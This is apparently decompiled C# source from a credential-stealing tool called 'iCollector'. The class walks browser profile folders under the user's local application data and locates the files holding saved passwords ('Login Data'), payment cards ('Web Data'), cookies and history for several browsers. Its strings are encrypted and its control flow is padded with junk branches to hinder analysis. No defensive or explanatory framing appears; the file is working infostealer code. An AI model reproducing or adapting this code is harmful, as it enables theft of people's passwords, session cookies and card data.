using System;
using System.Collections.Generic;
using System.IO;
using iCollector.Job.Model;
using iCollector.Util;

namespace iCollector.Job.Handler;

internal class CKCResolver
{
	private static readonly string LCS_FILENAME_SE = "KN1ZlLfB0CMHU/mrut+OdA==.ODtH8k5fthwK4Frpw89dCvT2vNj/Pz0aTq4GROm0opM=";

	private static readonly string LCS_FILENAME = SecurityUtils.ReadStructEncrypted(LCS_FILENAME_SE);

	private static readonly string LOG_01_SE = "ievFCpk1DYfNfgPrFMyFAQ==.Avut83Llg85sFi5nadj9bEhv8eD5r/Qd7lNgWg3rsRaYtyzLt/cnzcb0xxVAjRAh";

	private static readonly string LOG_01;

	private static readonly string LOG_02_P1_SE;

	private static readonly string LOG_02_P1;

	private static readonly string LOG_02_P2_SE;

	private static readonly string LOG_02_P2;

	private static readonly string LOG_02_P3_SE;

	private static readonly string LOG_02_P3;

	private static readonly string LOG_02_P4_SE;

	private static readonly string LOG_02_P4;

	private static readonly string LOG_05_SE;

	private static readonly string LOG_05;

	private static readonly string REGEX_PROFILE_SE;

	private static readonly string REGEX_PROFILE;

	private static readonly string CLAZZ_NAME_SE;

	private static readonly string CLAZZ_NAME;

	private static readonly string WEB_DATA_SE;

	private static readonly string WEB_DATA;

	private static readonly string LOGIN_DATA_SE;

	private static readonly string LOGIN_DATA;

	private static readonly string COOK_FILE_SE;

	private static readonly string COOK_FILE;

	private static readonly string HISTORY_SE;

	private static readonly string HISTORY;

	private static readonly string NETWORK_SE;

	private static readonly string NETWORK;

	private static readonly string GG_SE;

	private static readonly string GG;

	private static readonly string ED_SE;

	private static readonly string ED;

	private static readonly string FF_SE;

	private static readonly string FF;

	private static readonly string BRV_SE;

	private static readonly string BRV;

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public CKModel Resolve(string path)
	{
		CKModel cKModel = new CKModel();
		CKModel cKModel2 = default(CKModel);
		if (0 == 0 && 7u != 0)
		{
			cKModel2 = cKModel;
		}
		CKModel cKModel3 = cKModel2;
		string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), path);
		if (0 == 0 && 0 == 0)
		{
			cKModel3.Path = path2;
		}
		CKModel cKModel4 = cKModel2;
		string lcsPath = Path.Combine(cKModel2.Path, LCS_FILENAME);
		if (5u != 0)
		{
			cKModel4.LcsPath = lcsPath;
		}
		if (!File.Exists(cKModel2.LcsPath))
		{
			Logger logger = log;
			LogContext logContext = ctx;
			string message = LOG_01 + cKModel2.LcsPath;
			if (0 == 0)
			{
				logger.Error(logContext, message);
			}
			return cKModel2;
		}
		CKModel cKModel5 = cKModel2;
		string cKType = GetCKType(cKModel2.Path);
		if (6u != 0)
		{
			cKModel5.Type = cKType;
		}
		List<CKProfile> list = ResolveCKProfiles(cKModel2, cKModel2.Path);
		List<CKProfile> list2;
		if (true)
		{
			list2 = list;
		}
		CKModel cKModel6 = cKModel2;
		if (0 == 0)
		{
			cKModel6.Profiles = list2;
		}
		CKModel cKModel7 = cKModel2;
		bool valid = list2.Count > 0;
		if (0 == 0)
		{
			cKModel7.Valid = valid;
		}
		Logger logger2 = log;
		LogContext logContext2 = ctx;
		string[] obj = new string[5] { LOG_02_P1, path, LOG_02_P2, null, null };
		int count = cKModel2.Profiles.Count;
		int num;
		if (2u != 0)
		{
			num = count;
		}
		obj[3] = num.ToString();
		obj[4] = LOG_02_P3;
		string message2 = string.Concat(obj);
		if (4u != 0)
		{
			logger2.Info(logContext2, message2);
		}
		return cKModel2;
	}

	private List<CKProfile> ResolveCKProfiles(CKModel model, string path)
	{
		List<CKProfile> list = new List<CKProfile>();
		List<CKProfile> list2 = default(List<CKProfile>);
		if (0 == 0 && 0 == 0)
		{
			list2 = list;
		}
		string[] array = default(string[]);
		int num2 = default(int);
		string text3 = default(string);
		while (true)
		{
			string[] directories = Directory.GetDirectories(path);
			if (0 == 0)
			{
				array = directories;
			}
			while (true)
			{
				int num = 0;
				if (num == 0)
				{
					if (0 == 0)
					{
						num2 = num;
					}
					goto IL_0027;
				}
				goto IL_0136;
				IL_0027:
				if (uint.MaxValue != 0)
				{
					if ((2 == 0) ? true : false)
					{
						continue;
					}
					if (false)
					{
						break;
					}
				}
				goto IL_0135;
				IL_0135:
				num = num2;
				goto IL_0136;
				IL_0136:
				if (num < array.Length)
				{
					string obj = array[num2];
					string text;
					if (uint.MaxValue != 0)
					{
						text = obj;
					}
					int num3 = RegexUtils.FindRegexes(text, REGEX_PROFILE).Count;
					while (true)
					{
						if (num3 > 0)
						{
							string text2 = Path.Combine(path, text);
							if (0 == 0)
							{
								text3 = text2;
							}
							string iDStoreHeaderPath = GetIDStoreHeaderPath(text3);
							string text4;
							if (true)
							{
								text4 = iDStoreHeaderPath;
							}
							if (text4 == null)
							{
								Logger logger = log;
								LogContext logContext = ctx;
								string message = LOG_02_P4 + text3;
								if (true)
								{
									logger.Info(logContext, message);
								}
							}
							else
							{
								if (false)
								{
									break;
								}
								List<CKProfile> list3 = list2;
								CKProfile obj2 = new CKProfile
								{
									CCPath = Path.Combine(text3, WEB_DATA),
									IdHeaderPath = text4,
									PazzPath = Path.Combine(text3, LOGIN_DATA),
									HisPath = Path.Combine(text3, HISTORY),
									Path = text3
								};
								if (0 == 0)
								{
									obj2.Name = "";
								}
								if (0 == 0)
								{
									list3.Add(obj2);
								}
								Logger logger2 = log;
								LogContext logContext2 = ctx;
								string message2 = LOG_05 + text4;
								if (6u != 0)
								{
									logger2.Info(logContext2, message2);
								}
							}
						}
						if (false)
						{
							break;
						}
						num3 = num2;
						int num4 = 0;
						if (num4 == 0)
						{
							if (num4 != 0)
							{
								continue;
							}
							num4 = 1;
						}
						int num5 = num3 + num4;
						if (0 == 0)
						{
							num2 = num5;
						}
						goto IL_0135;
					}
					goto IL_0027;
				}
				return list2;
			}
		}
	}

	private string GetIDStoreHeaderPath(string parentPath)
	{
		if (false)
		{
			goto IL_0009;
		}
		int num;
		if (uint.MaxValue != 0)
		{
			num = -1;
			goto IL_0007;
		}
		goto IL_0018;
		IL_004a:
		string text = default(string);
		return text;
		IL_0018:
		num = (File.Exists(text) ? 1 : 0);
		if (false)
		{
			goto IL_0007;
		}
		if (num != 0)
		{
			return text;
		}
		string text2 = Path.Combine(parentPath, NETWORK, COOK_FILE);
		if (6u != 0 && 0 == 0)
		{
			text = text2;
		}
		if (false || false || (0 == 0 && !File.Exists(text)))
		{
			return null;
		}
		goto IL_004a;
		IL_0009:
		string text3 = Path.Combine(parentPath, COOK_FILE);
		if (6u != 0 && 0 == 0)
		{
			text = text3;
		}
		goto IL_0018;
		IL_0007:
		if (num != 0)
		{
			goto IL_0009;
		}
		goto IL_004a;
	}

	private string GetCKType(string path)
	{
		int num = (string.IsNullOrEmpty(path) ? 1 : 0);
		if (4u != 0)
		{
			if (num != 0)
			{
				goto IL_000b;
			}
			if (7 == 0 || path.Contains(GG))
			{
				goto IL_0021;
			}
			if (path.Contains(ED))
			{
				return CKType.EMB;
			}
			goto IL_003a;
		}
		goto IL_0048;
		IL_003a:
		if (path.Contains(FF))
		{
			num = 8;
			goto IL_0048;
		}
		goto IL_0056;
		IL_0056:
		int num2 = (path.Contains(BRV) ? 1 : 0);
		goto IL_0061;
		IL_000b:
		return CKType.NULL;
		IL_0021:
		return CKType.HCB;
		IL_0061:
		if (num2 != 0)
		{
			if (0 == 0)
			{
				if (0 == 0)
				{
					return CKType.RBB;
				}
				goto IL_003a;
			}
			goto IL_0056;
		}
		return CKType.MCB;
		IL_0048:
		if (num == 0)
		{
			goto IL_000b;
		}
		num2 = 1;
		if (num2 != 0)
		{
			if (num2 != 0)
			{
				return CKType.ZIF;
			}
			goto IL_0021;
		}
		goto IL_0061;
	}

	static CKCResolver()
	{
		if (0 == 0)
		{
			if (false)
			{
				goto IL_014e;
			}
			LOG_01 = SecurityUtils.ReadStructEncrypted(LOG_01_SE);
			if (false)
			{
				goto IL_00c8;
			}
			LOG_02_P1_SE = "p1Km5Oh6EWrR+C6rF7m/Yw==.JBTT1DnJK78JzWru95AatY6tZXSnFyJCMX1a4fG8VQY=";
			LOG_02_P1 = SecurityUtils.ReadStructEncrypted(LOG_02_P1_SE);
			LOG_02_P2_SE = "7QDgreD8TlC+Bj2aJMt+vw==.0faU0jeVTXAlbbKzA0fVRMtr66lqdTGzZ5qEVdxiGQ0=";
			LOG_02_P2 = SecurityUtils.ReadStructEncrypted(LOG_02_P2_SE);
			LOG_02_P3_SE = "UXKHY4cI29Z6D4L0fzYRdw==.XGcmeD5J93jpD4ub/z+6yzWCnRaZAha2oZkGLXOUO2s=";
		}
		LOG_02_P3 = SecurityUtils.ReadStructEncrypted(LOG_02_P3_SE);
		LOG_02_P4_SE = "xseScm6SZMcO1KL3keZUjA==.z6KH+kS1DbAIBBMiayYN/BcW4qPEhlxQtIdZvI8BVBbn9CGCYUBtvpxMHW26h40O";
		LOG_02_P4 = SecurityUtils.ReadStructEncrypted(LOG_02_P4_SE);
		goto IL_00a5;
		IL_01a5:
		ED = SecurityUtils.ReadStructEncrypted(ED_SE);
		FF_SE = "27ZM05bbi60fcPJQxwJPCQ==.w9hp6ilY38bGRuj0K2I9bS/Q3JGxxo2dPeu31n+Q2ZQ=";
		FF = SecurityUtils.ReadStructEncrypted(FF_SE);
		BRV_SE = "TUDBQWIN8EW/HceW8FDHnw==.WYbUSZ7jWYriFYdF6meYO5gSSLSKVAunMuGO+8StW+Y=";
		goto IL_01d7;
		IL_01d7:
		BRV = SecurityUtils.ReadStructEncrypted(BRV_SE);
		return;
		IL_014e:
		if (0 == 0)
		{
			HISTORY = SecurityUtils.ReadStructEncrypted(HISTORY_SE);
			NETWORK_SE = "lp2NfBOC6PsqsXNWfarrpg==.abu+ImLksBaUyJwwZAAO73z+7OPY/NilV9ccUXrHB5M=";
			NETWORK = SecurityUtils.ReadStructEncrypted(NETWORK_SE);
			GG_SE = "q3wOthU0JU5jwfaMeL6EmQ==.zVzDZttNE8nIqcZo8Zx6s6kdGQ8SEQvTTt8pIRFU/jI=";
			GG = SecurityUtils.ReadStructEncrypted(GG_SE);
			if (1 == 0)
			{
				goto IL_00a5;
			}
			ED_SE = "++0N+aE6QvHISE/JbMtSNg==.7wqrUSlsHGAEYAjafDDMuKTh5oFcj+L/k32ryotcPOA=";
			goto IL_01a5;
		}
		goto IL_01d7;
		IL_00c8:
		REGEX_PROFILE = SecurityUtils.ReadStructEncrypted(REGEX_PROFILE_SE);
		if (6u != 0)
		{
			CLAZZ_NAME_SE = "WPk55Fi2pGdYCLc8Q+xoMA==.q7C38vzjUp4NQfgCsY7RYPX/OMMDWE5wc9IWvx8HH9M=";
			CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);
			WEB_DATA_SE = "lppRetn3APTfevphPCDxGA==.BR6/SA1+kJioREhU3RqMWOCozBfWBaAkYWvPlT6eXl4=";
			if (2 == 0)
			{
				goto IL_00af;
			}
			WEB_DATA = SecurityUtils.ReadStructEncrypted(WEB_DATA_SE);
			LOGIN_DATA_SE = "4C3r22XWADBjFw/2PMvkJg==.yjaM+Fb+5brVTN2fwW2Zj+AZX/sfG8r8sPqexojEHrM=";
			LOGIN_DATA = SecurityUtils.ReadStructEncrypted(LOGIN_DATA_SE);
			COOK_FILE_SE = "tEptbdIJiI01haDqbak4vA==.Vkap49mSI2I0sB2+N8XCzAz+tpL1ABWmBn+oD7wHeDs=";
			COOK_FILE = SecurityUtils.ReadStructEncrypted(COOK_FILE_SE);
			HISTORY_SE = "jCeN1fP315M1ti7OSJ7USA==.kesbvNAP0bmULk+M3RnDiheEbGchxOeKERkReFhIFfM=";
			goto IL_014e;
		}
		goto IL_01a5;
		IL_00a5:
		LOG_05_SE = "uW4GnqEHG6BQAzbU5a0I1w==.kdeJQv5BZ/3zPVkeuem5alrMOgTwNF1xLhwVaL7S2lMaNXexkC+ucOpLVxy/Vsf1";
		goto IL_00af;
		IL_00af:
		LOG_05 = SecurityUtils.ReadStructEncrypted(LOG_05_SE);
		REGEX_PROFILE_SE = "W+TtkStwrHymW84xZsr7yg==.1CIzV7FsSYcqaQoS4+h+izygApJanuBoniccc+fX1pImlAjlDZmW1nw0HCIb4Ukv";
		goto IL_00c8;
	}
}
